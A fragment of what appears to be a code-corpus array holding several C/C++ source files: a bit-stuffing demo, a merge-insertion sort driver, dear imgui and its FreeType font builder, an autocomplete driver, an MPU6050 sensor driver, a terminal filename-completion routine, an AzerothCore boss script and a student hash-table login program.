}\r\n    printf(\"\\n\");\r\n}\r\n\r\nint main() {\r\n    // Example input frame (in hexadecimal format)\r\n    uint8_t inputFrame[] = {0xFF, 0x00, 0xAA}; // Example input data\r\n    size_t inputLength = sizeof(inputFrame) / sizeof(inputFrame[0]);\r\n\r\n    // Prepare output frame\r\n    uint8_t outputFrame[1024];\r\n    size_t outputLength = 0;\r\n\r\n    // Perform bit stuffing\r\n    bitStuffing(inputFrame, inputLength, outputFrame, &outputLength);\r\n\r\n    // Print input and output frames in hexadecimal format\r\n    printf(\"Input Frame:\\n\");\r\n    printHex(inputFrame, inputLength);\r\n\r\n    printf(\"Output Frame:\\n\");\r\n    printHex(outputFrame, outputLength);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"PmergeMe.hpp\"\n\nvoid    print_deq(std::deque<int> deq, int n)\n{\n    int len = deq.size();\n    switch(n)\n    {\n        case 0:\n        std::cout << \"Before \";\n        break ;\n        case 1:\n        std::cout << \"After \";\n    }\n    for (int i = 0; i < len; i++)\n        std::cout << deq[i] << \" \";\n    std::cout << \"\\n\";\n}\n\nvoid    print_vec(std::vector<int> vec, int n)\n{\n    int len = vec.size();\n    switch(n)\n    {\n        case 0:\n        std::cout << \"Before \";\n        break ;\n        case 1:\n        std::cout << \"After \";\n    }\n    for (int i = 0; i < len; i++)\n        std::cout << vec[i] << \" \";\n    std::cout << \"\\n\";\n}\n\nbool    check_duplicates(std::vector<int> vec)\n{\n    int len = vec.size();\n    for (int i = 0; i < len; i++)\n    {\n        for (int j = i + 1; j < len; j++)\n        {\n            if (vec[i] == vec[j])\n                return false;\n        }\n    }\n    return true;\n}\n\nvoid    store_data(std::vector<int> &vec, std::deque<int> &deq, int argc, char **argv)\n{\n    int num_elem;\n    for (int i = 1; i < argc; i++) \n    {\n        for (int j = 0; argv[i][j] != '\\0'; j++) \n        {\n            if (!(isdigit(argv[i][j]) || (j == 0 && (argv[i][j] == '-' || argv[i][j] == '+')))) \n            {\n                std::cout << \"Error: non-numeric character\" << std::endl;\n                exit(1);\n            }\n        }\n        if (std::atoi(argv[i]) < 0) \n        {\n            std::cout << \"Error: not a positive number\" << std::endl;\n            exit(1);\n        }\n        vec.push_back(std::atoi(argv[i]));\n        deq.push_back(std::atoi(argv[i]));\n        num_elem = i;\n    }\n    if (check_duplicates(vec) == false)\n    {\n        std::cout << \"Error: duplicates detected\" << std::endl;\n        exit(1);\n    }\n}\n\nint main(int argc, char **argv)\n{\n    if (argc < 2)\n    {\n        std::cout << \"Invalid number of arguments\" << std::endl;\n        return (1);\n    }\n    std::vector<int> vec;\n    std::deque<int> deq;\n    store_data(vec, deq, argc, argv);\n\n    clock_t vstart = clock();\n    clock_t vend = clock();\n    double vec_time = static_cast<double>(vend - vstart) * 1000000 / CLOCKS_PER_SEC;\n    std::cout << \"__________\" << std::endl;\n    print_vec(vec, 0);\n    groupVec(vec);\n    print_vec(vec, 1);\n    std::cout << \"Time to process a range of \" << vec.size() << \" elements with std::vector<int> : \" << vec_time << \"us\" << std::endl;\n\n    clock_t dstart = clock();\n    clock_t dend = clock();\n    double dec_time = static_cast<double>(dend - dstart) * 1000000 / CLOCKS_PER_SEC;\n    std::cout << \"__________\" << std::endl;\n    print_deq(deq, 0);\n    groupDeq(deq);\n    print_deq(deq, 1);\n    std::cout << \"Time to process a range of \" << deq.size() << \" elements with std::deque<int> : \" << dec_time << \"us\" << std::endl;\n    return (0);\n}",
    "// dear imgui, v1.89.7 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.com/faq\n// - Homepage & latest     https://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/6478 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Minimize state synchronization.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n CONTROLS GUIDE\n ==============\n\n - MOUSE CONTROLS\n   - Mouse wheel:                   Scroll vertically.\n   - SHIFT+Mouse wheel:             Scroll hor",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include \"Lista.h\"\n#include \"Termo.h\"\n#include \"Autocompletar.h\"\n\n\nint main(int argc, char* argv[]) {\n    if (argc < 3) {\n        std::cerr << \"Uso: \" << argv[0] << \" <arquivo_dataset> <k>\" << std::endl;\n        return 1;\n    }\n\n    std::ifstream arquivo(argv[1]);\n    int k = std::stoi(argv[2]);\n\n    if (!arquivo) {\n        std::cerr << \"Erro ao abrir o arquivo\" << std::endl;\n        return 1;\n    }\n\n    ListaOrdenada<Termo> termos;\n    std::string linha;\n\n    while (std::getline(arquivo, linha)) {\n        std::istringstream iss(linha);\n        long peso;\n        std::string termo;\n\n        std::string pesoString;\n        std::getline(iss, pesoString, '\\t');\n        peso = std::stol(pesoString);\n\n        std::getline(iss, termo);\n\n        if (termo.empty()) {\n            std::cerr << \"Erro ao ler o termo\" << std::endl;\n            exit(1);\n        }\n\n        termos.inserir(Termo(termo, peso));\n        \n    }\n    \n    Autocompletar autocomplete(termos);\n    std::string consulta;\n    while (true) {\n        std::cout << \"Qual o termo a ser procurado? (digite \\\"sair\\\" para encerrar o programa): \";\n        std::getline(std::cin, consulta);\n        if (consulta == \"sair\") break;\n\n        autocomplete.buscar(consulta, k);\n    }\n\n    return 0;\n}\n",
    "// dear imgui: FreeType font builder (used as a replacement for the stb_truetype builder)\n// (code)\n\n// Get the latest version at https://github.com/ocornut/imgui/tree/master/misc/freetype\n// Original code by @vuhdo (Aleksei Skriabin). Improvements by @mikesart. Maintained since 2019 by @ocornut.\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2023/08/01: added support for SVG fonts, enable by using '#define IMGUI_ENABLE_FREETYPE_LUNASVG' (#6591)\n//  2023/01/04: fixed a packing issue which in some occurrences would prevent large amount of glyphs from being packed correctly.\n//  2021/08/23: fixed crash when FT_Render_Glyph() fails to render a glyph and returns NULL.\n//  2021/03/05: added ImGuiFreeTypeBuilderFlags_Bitmap to load bitmap glyphs.\n//  2021/03/02: set 'atlas->TexPixelsUseColors = true' to help some backends with deciding of a prefered texture format.\n//  2021/01/28: added support for color-layered glyphs via ImGuiFreeTypeBuilderFlags_LoadColor (require Freetype 2.10+).\n//  2021/01/26: simplified integration by using '#define IMGUI_ENABLE_FREETYPE'. renamed ImGuiFreeType::XXX flags to ImGuiFreeTypeBuilderFlags_XXX for consistency with other API. removed ImGuiFreeType::BuildFontAtlas().\n//  2020/06/04: fix for rare case where FT_Get_Char_Index() succeed but FT_Load_Glyph() fails.\n//  2019/02/09: added RasterizerFlags::Monochrome flag to disable font anti-aliasing (combine with ::MonoHinting for best results!)\n//  2019/01/15: added support for imgui allocators + added FreeType only override function SetAllocatorFunctions().\n//  2019/01/10: re-factored to match big update in STB builder. fixed texture height waste. fixed redundant glyphs when merging. support for glyph padding.\n//  2018/06/08: added support for ImFontConfig::GlyphMinAdvanceX, GlyphMaxAdvanceX.\n//  2018/02/04: moved to main imgui repository (away from http://www.github.com/ocornut/imgui_club)\n//  2018/01/22: fix for addition of ImFontAtlas::TexUvscale member.\n//  2017/10/22: minor inconsequential change to match change in master (removed an unnecessary statement).\n//  2017/09/26: fixes for imgui internal changes.\n//  2017/08/26: cleanup, optimizations, support for ImFontConfig::RasterizerFlags, ImFontConfig::RasterizerMultiply.\n//  2017/08/16: imported from https://github.com/Vuhdo/imgui_freetype into http://www.github.com/ocornut/imgui_club, updated for latest changes in ImFontAtlas, minor tweaks.\n\n// About Gamma Correct Blending:\n// - FreeType assumes blending in linear space rather than gamma space.\n// - See https://www.freetype.org/freetype2/docs/reference/ft2-base_interface.html#FT_Render_Glyph\n// - For correct results you need to be using sRGB and convert to linear space in the pixel shader output.\n// - The default dear imgui styles will be impacted by this change (alpha values will need tweaking).\n\n// FIXME: cfg.OversampleH, OversampleV are not supported (but perhaps not so necessary with this rasterizer).\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_freetype.h\"\n#include \"imgui_internal.h\"     // ImMin,ImMax,ImFontAtlasBuild*,\n#include <stdint.h>\n#include <ft2build.h>\n#include FT_FREETYPE_H          // <freetype/freetype.h>\n#include FT_MODULE_H            // <freetype/ftmodapi.h>\n#include FT_GLYPH_H             // <freetype/ftglyph.h>\n#include FT_SYNTHESIS_H         // <freetype/ftsynth.h>\n\n#ifdef IMGUI_ENABLE_FREETYPE_LUNASVG\n#include FT_OTSVG_H             // <freetype/otsvg.h>\n#include FT_BBOX_H              // <freetype/ftbbox.h>\n#include <lunasvg.h>\n#if !((FREETYPE_MAJOR >= 2) && (FREETYPE_MINOR >= 12))\n#error IMGUI_ENABLE_FREETYPE_LUNASVG requires FreeType version >= 2.12\n#endif\n#endif\n\n#ifdef _MSC_VER\n#pragma warning (push)\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n#ifdef __GNUC__\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#ifndef __clang__\n#pragma GCC diagnostic ignored \"-Wsubobject-linkage\"        // warning: 'xxxx' has a field 'xxxx' whose type uses the anonymous namespace\n#endif\n#endif\n\n//-------------------------------------------------------------------------\n// Data\n//-------------------------------------------------------------------------\n\n// Default memory allocators\nstatic void* ImGuiFreeTypeDefaultAllocFunc(size_t size, void* user_data) { IM_UNUSED(user_data); return IM_ALLOC(size); }\nstatic void  ImGuiFreeTypeDefaultFreeFunc(void* ptr, void* user_data) { IM_UNUSED(user_data); IM_FREE(ptr); }\n\n// Current memory allocators\nstatic void* (*GImGuiFreeTypeAllocFunc)(size_t size, void* user_data) = ImGuiFreeTypeDefaultAllocFunc;\nstatic void  (*GImGuiFreeTypeFre",
    "#include \"../include/mpu6050.hpp\"\r\n#include <array>\r\n#include <libhal/timeout.hpp>\r\n#include <libhal-util/i2c.hpp>\r\nusing namespace std::chrono_literals;\r\n\r\nmpu6050::mpu6050(hal::i2c& p_i2c, hal::steady_clock& p_clock, hal::serial& p_terminal) : m_i2c(p_i2c), m_clock(p_clock), m_terminal(p_terminal){\r\n    hal::print(m_terminal, \"before setup\");\r\n    setup();\r\n}\r\n\r\nvoid mpu6050::setup(){\r\n   // hal::print(m_terminal, \"Intial Offset: \");\r\n   // hal::delay(m_clock, 10ms);\r\n    //serial:: wait for user (look at this later)\r\n    //serial:: set timer between each input\r\n    \r\n    //talk with mpu6050 to use function no_sleep\r\n\r\n   \r\n//      static constexpr hal::byte expected_device_id = 0x68;\r\n//   // Read out the identity register\r\n//   auto device_id =\r\n//     hal::write_then_read<1>(m_i2c,\r\n//                             addresses::MPU_addr,\r\n//                             std::array{ addresses::WHO_AM_I },\r\n//                             hal::never_timeout())[0];\r\n\r\n//   if (device_id != expected_device_id) {\r\n//     hal::safe_throw(hal::no_such_device(m_address, this));\r\n//   }\r\n\r\n    \r\n    mpu6050::no_sleep();\r\n    hal::print(m_terminal, \"no sleep complete\");\r\n    mpu6050::accel_config();\r\n    hal::print(m_terminal, \"accel complete\");\r\n    hal::print(m_terminal, \"after setup\");\r\n    //mpu6050::intialize_servo();\r\n\r\n\r\n}\r\n void mpu6050::read_xy(){\r\n\r\n    // WHO AM I returns 0x68\r\n    // hal::write(m_i2c, addresses::MPU_addr, std::array<hal::byte, 1>{addresses::WHO_AM_I});\r\n    // std::array<hal::byte, 1> a;\r\n    // hal::read(m_i2c, addresses::MPU_addr, a);\r\n\r\n    // return;\r\n    std::array<hal::byte, 4> data;\r\n    \r\n    hal::write(m_i2c, addresses::MPU_addr, std::array<hal::byte, 1>{addresses::ACCEL_XOUT_H});\r\n    hal::read(m_i2c, addresses::MPU_addr, data);\r\n\r\n    X_out = ((data[0] << 8) | data[1]); // this makes it so that it reads 8 bits because i2c reads 8 bits at a time \r\n    X_out = X_out / 16384;  // the value is divided by 16384 because thats the LSB Sensitivity on page 29 of the register \r\n    Y_out = ((data[2] << 8) | data[3]);\r\n    Y_out = Y_out / 16384;\r\n    //reads ACCEL_XOUT_H, ACCEL_XOUT_H, ACCEL_YOUT_H, ACCEL_YOUT_H\r\n    //shift bits\r\n\r\n    //in the default position I want, the x_out value is -1, and y_out is 0\r\n    X_out+=1;\r\n\r\n    //Change X_out and Y_out to angles\r\n    X_out=X_out*100;\r\n    Y_out=Y_out*100;\r\n    \r\n    \r\n    \r\n }\r\n\r\n\r\n\r\nvoid mpu6050::no_sleep(){\r\n    // mpu6050::start();\r\n    // hal::write(m_i2c, addresses::MPU_addr, std::array<hal::byte, 1> {addresses::start_address});\r\n\r\n    hal::print(m_terminal,\"sent start\\n\");\r\n    hal::write(m_i2c, addresses::MPU_addr, std::array<hal::byte, 2> {addresses::start_address, modes::no_sleep_var});\r\n    //makes sure the mput6050 doesnt randomly turn off sleep stuff\r\n    //write to 0x6B\r\n    //write to 0x00\r\n}\r\n\r\nvoid mpu6050::accel_config(){\r\n    hal::write(m_i2c, addresses::MPU_addr, std::array<hal::byte, 2>{addresses::ACCEL_CONFIG, 0x00});\r\n    //write to 0x1B\r\n    //write to 0x10\r\n}\r\n\r\n\r\nvoid mpu6050::servo_point_up(){\r\n    \r\n    //hal::position(start_angle + user_offset - Y_out); //servo always pointing up\r\n}\r\n\r\nvoid mpu6050::initialize_servo(){\r\n    //intialize\r\n    //hal::position(start_angle);\r\n    hal::delay(m_clock, 10ms);\r\n}",
    "//\n//                    R e a d  F i l e n a m e . c p p\n//\n//  Function:\n//    ReadFilename() prompts for a filename and returns one entered by the user\n//\n//  Description:\n//    ReadFilename() provides a way for a command line program - ie one run\n//    from a terminal - to prompt the user for the name of a file. What makes\n//    this more than just a \"write a prompt, read a line\" routine is that it\n//    supports filename completion. For full details, see the comments at the\n//    start of ReadFilename.h. \n//\n//  Versions:\n//    The original version of this code was developed on MacOS and only meant\n//    to run on UNIX-like systems such as MacOS and Linux. It makes a lot of\n//    use of very UNIX-specific system calls. If built under a different OS,\n//    such as Windows, this version bypasses almost all the code here and\n//    builds a minimal routine that prompts for a filename and returns the\n//    response, but does none of the fancy filename completion of the UNIX\n//    version.\n\n//  Author: Keith Shortridge, K&V (Keith@Knave&Varlet.com.au)\n//\n//  History:\n//     22nd Jan 2021. Original version. KS.\n//      4th Oct 2024. Now builds under Windows, but without all the fancy\n//                    filename completion. KS.\n\n#include \"ReadFilename.h\"\n\n#if defined(__unix__) || (defined(__APPLE__) && defined(__MACH__))\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <glob.h>\n\n#include <sys/time.h>\n#include <termios.h>\n\n// -----------------------------------------------------------------------------\n//\n//                     I n t e r n a l  R o u t i n e s\n\nstatic void CheckTilde (char* Line,int MaxIdx, int* LineSt,int* PathSt);\nstatic void HandleCtrlD (const char* Prompt,char* Line,size_t Len,int Idx);\nstatic void HandleTab (char* Line,size_t Len,int* Idx);\n\n\n// -----------------------------------------------------------------------------\n//\n//                         R e a d  F i l e n a m e\n//\n//  This is ReadFilename() itself. It outputs the prompt that it\n//  is passed, then sets the terminal into non-canonical/no echo mode so it\n//  has control voer what the user sees, as opposed to just echoing characters\n//  as they're typed, and starts to read characters from the user. It handles\n//  TAB and ^D characters to provide filename completion, and finally\n//  returns the entered filename. If all goes well, it returns zero, but\n//  can return -1 to indicate an error changing the terminal mode.\n//\n//    Prompt is a C-style character string, nul-terminated, that is output\n//           as a prompt to the user. Normally, it would be something along\n//           the lines of \"Enter filename: \".\n//    Line   is the address of the start of an array of char, into which the\n//           resulting file specification, entered by the user, is returned.\n//           It will always be terminated by a final nul character.\n//    Len    is the number of bytes in the Line array - it will normally\n//           be just sizeof(Line).\n\nint ReadFilename (const char* Prompt, char* Line, size_t Len)\n{\n   int Code = 0;\n   char Del = 127;\n   char Backup = 0x8;\n   int CtrlD = 0x4;\n   struct termios OldMode;\n   struct termios NewMode;\n\n   //  Put out the prompt.\n   \n   printf (\"%s\",Prompt);\n   \n   //  Get the current terminal attributes, save them, and apply a new\n   //  set of attributes based on the current ones, but with canonical mode\n   //  (reading a line at a time) disabled, automatic echoing disabled,\n   //  and the timer disabled and input set to one byte at a time.\n   \n   Code = tcgetattr (0, &OldMode);\n   if (Code == 0) {\n      memcpy (&NewMode, &OldMode, sizeof(struct termios));\n      NewMode.c_lflag &= ~(ICANON | ECHO);\n      NewMode.c_cc[VTIME] = 0;\n      NewMode.c_cc[VMIN] = 1;\n      Code = tcsetattr (0, TCSANOW, &NewMode);\n      if (Code == 0) {\n         int Idx = 0;\n         int MaxIdx = Len - 1;\n         \n         //  Now just read characters one by one until we get a newline (or\n         //  EOF). Most characters are just put directly into Line and\n         //  echoed, but some are handled explicitly.\n         \n         for (;;) {\n            char Char = fgetc(stdin);\n            if (Char == '\\n' || Char == EOF) {\n               fputc (Char,stdout);\n               Line[Idx] = '\\0';\n               break;\n            }\n            if (Char == Del) {\n            \n               //  Delete is handled by backing up over the last character,\n               //  blanking it by writing a space, and then backing up over\n               //  that space.\n               \n               if (Idx > 0) {\n                  fputc (Backup,stdout);\n                  fputc (' ',stdout);\n                  fputc (Backup,stdout);\n                  Idx--;\n               }\n            } else if (Char == '\\t') {\n            \n               //  A TAB triggers filename completion, and is complex enough\n               //  to need its own routine.\n               \n               HandleTab (Line,Len,&Idx);\n               \n       ",
    "/*\n * This file is part of the AzerothCore Project. See AUTHORS file for Copyright information\n *\n * This program is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Affero General Public License as published by the\n * Free Software Foundation; either version 3 of the License, or (at your\n * option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License for\n * more details.\n *\n * You should have received a copy of the GNU General Public License along\n * with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"CreatureScript.h\"\n#include \"ScriptedCreature.h\"\n#include \"gundrak.h\"\n\nenum Spells\n{\n    SPELL_ECK_BERSERK                   = 55816,\n    SPELL_ECK_BITE                      = 55813,\n    SPELL_ECK_SPIT                      = 55814,\n    SPELL_ECK_SPRING                    = 55815,\n    SPELL_ECK_SPRING_INIT               = 55837\n};\n\nenum Misc\n{\n    POINT_START                         = 0,\n    EVENT_ECK_BERSERK                   = 1,\n    EVENT_ECK_BITE                      = 2,\n    EVENT_ECK_SPIT                      = 3,\n    EVENT_ECK_SPRING                    = 4,\n    EVENT_ECK_HEALTH                    = 5\n};\n\nclass boss_eck : public CreatureScript\n{\npublic:\n    boss_eck() : CreatureScript(\"boss_eck\") { }\n\n    CreatureAI* GetAI(Creature* creature) const override\n    {\n        return GetGundrakAI<boss_eckAI>(creature);\n    }\n\n    struct boss_eckAI : public BossAI\n    {\n        boss_eckAI(Creature* creature) : BossAI(creature, DATA_ECK_THE_FEROCIOUS)\n        {\n        }\n\n        void InitializeAI() override\n        {\n            BossAI::InitializeAI();\n            me->GetMotionMaster()->MovePoint(POINT_START, 1638.55f, 919.76f, 104.95f, false);\n            me->SetHomePosition(1642.712f, 934.646f, 107.205f, 0.767f);\n            me->SetReactState(REACT_PASSIVE);\n        }\n\n        void MovementInform(uint32 type, uint32 id) override\n        {\n            if (type == POINT_MOTION_TYPE && id == POINT_START)\n            {\n                me->CastSpell(me, SPELL_ECK_SPRING_INIT, true);\n                me->SetReactState(REACT_AGGRESSIVE);\n            }\n        }\n\n        void Reset() override\n        {\n            BossAI::Reset();\n        }\n\n        void JustEngagedWith(Unit* who) override\n        {\n            BossAI::JustEngagedWith(who);\n            events.ScheduleEvent(EVENT_ECK_BERSERK, 60s, 90s);\n            events.ScheduleEvent(EVENT_ECK_BITE, 5s);\n            events.ScheduleEvent(EVENT_ECK_SPIT, 10s);\n            events.ScheduleEvent(EVENT_ECK_SPRING, 8s);\n        }\n\n        void JustDied(Unit* killer) override\n        {\n            BossAI::JustDied(killer);\n        }\n\n        void UpdateAI(uint32 diff) override\n        {\n            if (!UpdateVictim())\n                return;\n\n            events.Update(diff);\n            if (me->HasUnitState(UNIT_STATE_CASTING))\n                return;\n\n            switch (events.ExecuteEvent())\n            {\n                case EVENT_ECK_HEALTH:\n                    if (me->HealthBelowPct(21))\n                    {\n                        events.CancelEvent(EVENT_ECK_BERSERK);\n                        me->CastSpell(me, SPELL_ECK_BERSERK, false);\n                        break;\n                    }\n                    events.ScheduleEvent(EVENT_ECK_HEALTH, 1s);\n                    break;\n                case EVENT_ECK_BERSERK:\n                    me->CastSpell(me, SPELL_ECK_BERSERK, false);\n                    events.CancelEvent(EVENT_ECK_HEALTH);\n                    break;\n                case EVENT_ECK_BITE:\n                    me->CastSpell(me->GetVictim(), SPELL_ECK_BITE, false);\n                    events.ScheduleEvent(EVENT_ECK_BITE, 8s, 12s);\n                    break;\n                case EVENT_ECK_SPIT:\n                    me->CastSpell(me->GetVictim(), SPELL_ECK_SPIT, false);\n                    events.ScheduleEvent(EVENT_ECK_SPIT, 10s);\n                    break;\n                case EVENT_ECK_SPRING:\n                    if (Unit* target = SelectTarget(SelectTargetMethod::Random, 1, 30.0f, true))\n                    {\n                        me->GetThreatMgr().ResetAllThreat();\n                        me->AddThreat(target, 500.0f);\n                        me->CastSpell(target, SPELL_ECK_SPRING, false);\n                    }\n\n                    events.ScheduleEvent(EVENT_ECK_SPRING, 5s, 10s);\n                    break;\n            }\n\n            DoMeleeAttackIfReady();\n        }\n    };\n};\n\nvoid AddSC_boss_eck()\n{\n    new boss_eck();\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include \"sha256.h\"\r\n//include your hash table---------------------------------------------------------------------------------------------------\r\n#include \"hashTable.h\"\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\t\r\n\thashTable* table;\r\n\r\n\tifstream file(\"testlist.txt\");\r\n\tint menuChoice;\r\n\tint numUsers;\r\n\tstring user, pwd, salt;\r\n\tstring username, password;\r\n\t\r\n\tif(file.is_open())\r\n\t{\r\n\tfile >> numUsers;\r\n\tfile.ignore(1, '\\n');\r\n\t//dynamically allocate your hash table-------------------------------------------------------------------------------\r\n\thashTable* table = new hashTable(numUsers);\r\n\r\n\t\r\n\t\r\n\twhile(getline(file, user))\r\n\t{\r\n\t\tgetline(file, pwd);\r\n\t\t//generate a salt and add the new user to your table--------------------------------------------------------\r\n    \r\n    //generates a salt\r\n    \tsalt = sha256(user);\r\n    \r\n    //adds the new user to the hash table\r\n\t\ttable->addEntry(user, pwd, salt);\r\n\t}\r\n\t}\r\n\t\r\n\tdo\r\n\t{\r\n\t\tcout << \"\\nWhat would you like to do?\\n\";\r\n\t\tcout << \"1.  Login.\\n\";\r\n\t\tcout << \"2.  Create account.\\n\";\r\n\t\tcout << \"3.  Delete account.\\n\";\r\n\t\tcout << \"4.  Exit.\\n\";\r\n\t\tcout << \"CHOOSE 1-4:  \";\r\n\t\tcin >> menuChoice;\r\n\t\twhile(menuChoice < 1 || menuChoice > 4)\r\n\t\t{\r\n\t\t\tcout << \"That is not a valid choice.\\n\";\r\n\t\t\tcout << \"CHOOSE 1-4:  \";\r\n\t\t\tcin >> menuChoice;\r\n\t\t}\r\n\t\t\r\n\t\tswitch(menuChoice)\r\n\t\t{\r\n\t\t\tcase 1:\tcout << \"enter your username:  \";\r\n\t\t\t\t\tcin >> username;\r\n\t\t\t\t\tcout << \"enter your password:  \";\r\n\t\t\t\t\tcin >> password;\r\n\t\t\t\t\t\r\n\t\t\t\t\tif(table->validateLogin(username, password))//check if the user's credentials are correct-----------------------------------\r\n\r\n\t\t\t\t\t\tcout << \"login successful\\n\";\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\tcout << \"invalid credentials\\n\";\r\n\t\t\t\t\t\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\tcase 2: cout << \"enter your new username:  \";\r\n\t\t\t\t\tcin >> username;\r\n\t\t\t\t\tcout << \"enter your new password:  \";\r\n\t\t\t\t\tcin >> password;\r\n\t\t\t\t\t\r\n\t\t\t\t\t//generate a salt for the new user and add the user to the table--------------------\r\n\t\t\t\t\tsalt = table->generateSalt();\r\n\t\t\t\t\ttable->addEntry(username, password, salt);\r\n\t\t\t\t\t\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\tcase 3:\tcout << \"enter your username:  \";\r\n\t\t\t\t\tcin >> username;\r\n\t\t\t\t\tcout << \"enter your password:  \";\r\n\t\t\t\t\tcin >> password;\r\n\t\t\t\t\t\r\n\t\t\t\t\tif(table->removeUser(username,password))//remove the user from the table and check if they were removed successfully----\r\n\t\t\t\t\t\tcout << \"user removed successfully.\\n\";\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\tcout << \"invalid credentials, cannot remove user.\\n\";\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\tcase 4:\tcout << \"goodbye\" << endl;\r\n\r\n\t\t\t\t\t//delete the hash table-------------------------------------------------------------\r\n\t\t\t\t\tdelete table;\r\n\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t}\r\n\t\t\r\n\t} while(menuChoice != 4);\r\n\r\n\treturn 0;\r\n}",
